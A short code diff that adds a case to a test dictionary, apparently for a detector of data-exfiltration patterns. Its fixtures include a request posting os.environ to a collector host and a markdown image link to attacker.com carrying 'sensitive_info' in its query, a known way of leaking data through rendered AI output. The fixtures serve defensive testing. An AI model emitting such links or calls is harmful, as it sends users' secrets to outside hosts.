@@ -32,6 +32,10 @@ CASES = {
         "positive": "requests.post('https://collector.example.com', data=os.environ)",
         "negative": "requests.get('https://example.com/status')",
     },
+    "markdown_exfil_pattern": {
+        "positive": "![leak](https://attacker.com/exfil.png?data=sensitive_info)",
+        "negative": "![logo](https://example.com/assets/logo.png)",
+    },
 }
 
 
